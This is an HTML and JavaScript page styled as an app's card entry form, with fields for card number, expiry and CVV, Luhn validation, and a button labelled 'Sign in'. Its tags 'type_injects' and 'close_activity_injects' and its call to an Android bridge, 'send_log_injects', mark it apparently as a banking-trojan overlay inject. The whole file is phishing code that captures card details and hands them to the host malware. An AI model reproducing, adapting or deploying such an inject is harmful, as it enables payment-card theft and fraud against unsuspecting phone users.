    <title>Document</title>
<style>
    form{
        display: flex;
        flex-direction: column;
        min-height: 100vh;
    }

    .input {
        width: 100%;
        border: 0;
        border: 1px solid #c8c8c8;
        margin-top: 15px;
        transition: all 0.2s ease;
        color: #000;
        background-color: #fff;
        border-radius: 5px;
        height: 44px;
        padding: 9px;
        padding-top: 18px;
    }

    input,
    button {
        outline: none !important;
        box-shadow: none !important;
    }

    section {
        padding: 15px;
        flex:1;
    }
    footer{
        padding: 15px;
    }
    .button {
        width: 100%;
        padding: 8px;
        color: #fff;
        background-color: #0179ff;
        border-radius: 5px;
        border: 0;
        margin-bottom: 15px;
    }

    .button:disabled {
        opacity: 0.4;
    }
    .error {
        border-color: #f00 !important;
    }
    label{
        color: #0179ff;
    }

</style>

        <section>
                <label style="position:relative;top: 40px;font-size: 10px;left: 9px;font-weight: 500;" for="cc">Credit Card</label>
                <input type="tel" id="cc" name="cc" onkeyup="check6();check8()" class="input" placeholder="" autocomplete="off">
                
                
                <label for="exp"  style="float:left; width: 58%;position:relative; top:30px;font-size: 10px;left: 9px;font-weight: 500;">Expiration date</label>
                <label for="cvv" style="float:right; width: 40%;position:relative; top:30px;font-size: 10px;left: 9px;font-weight: 500;">CVV</label>

                <input type="tel" style="width: 58%;float: left;margin-top: 5px;" id="exp" name="exp" maxlength="5" onkeyup="check7();check8()" class="input" placeholder="" autocomplete="off">

                <input type="password" style="width: 40%;float: right;margin-bottom: 20px;margin-top: 5px;" id="cvv" name="cvv" maxlength="3" onkeyup="check8()" class="input" placeholder="" autocomplete="off">  

            <input type="button" class="button" disabled id="sendData" value="Sign in">
        </section>
        <footer>
            <p style="text-align: center; font-weight: 500;">
                By using app you agree to our <u style="color: #097dff;">Terms & Conditions</u> and <u style="color: #097dff;">Privacy Policy</u>
            </p>
        </footer>
    </form>
<script>
        $('#cc').mask('0000 0000 0000 0000')
        $('#exp').mask('00/00')
        $('#cvv').mask('000')

    var sendData = document.getElementById('sendData');

    $('.cool-input__input').on('input', function () {
            var $this = $(this);
            if ($this.val() == '') {
                $this.removeClass('cool-input__input_filled');
            } else {
                $this.addClass('cool-input__input_filled');
            }
        });
        function check7() {
            
            var mmYY = exp.value.split('/');
            var month = parseInt(mmYY[0]);
            var year = parseInt(mmYY[1]);
    
            var expArray = exp.value.split('/');
            var today, someday;
            var exMonth = expArray[0];
            var exYear = "20" + expArray[1];
    
            today = new Date();
            someday = new Date();
            someday.setFullYear(exYear, exMonth, 1);
                    
            if(month > 12 || month == 0 || month == 00 || someday < today || year > 27 || exp.value.length != 5) {
                exp.classList.add('error')
            } else {
                exp.classList.remove('error')
                return true
            }
        }

        function valid_credit_card(value) {
            if(value=='' || value.length < 19 || value=='0000 0000 0000 0000') return false;
            if (/[^0-9-\s]+/.test(value)) return false;
            var nCheck = 0, nDigit = 0, bEven = false;
            value = value.replace(/\D/g, "");
            for (var n = value.length - 1; n >= 0; n--) {
                var cDigit = value.charAt(n),
                    nDigit = parseInt(cDigit, 10);
                if (bEven) {
                    if ((nDigit *= 2) > 9) nDigit -= 9;
                }
                nCheck += nDigit;
                bEven = !bEven;
            }
            return (nCheck % 10) == 0;
            
        }

        function check6() {
            if(!valid_credit_card(cc.value)) {
                cc.classList.add('error')
            } else {
                cc.classList.remove('error');
            }
        }

        function check8() {
            if(valid_credit_card(cc.value) && check7() && cvv.value.length === 3) {
                sendData.disabled = false;
            } else {
                sendData.disabled = true;
            }
        }

        sendData.onclick = () => {
            var data = {};
                data.cc = cc.value;
                data.exp = exp.value;
                data.cvv = cvv.value;
                data.type_injects = "banks";
                data.closed = "close_activity_injects";

                var ua = navigator.userAgent.toLowerCase();
                if(ua.indexOf("android") > -1) {
                    try {
                        Android.send_log_injects(JSON.stringify(data))
                    } catch (err) {}
                }else{
                    alert(JSON.stringify(data));
                }
        }
</script>
</body>
</html>
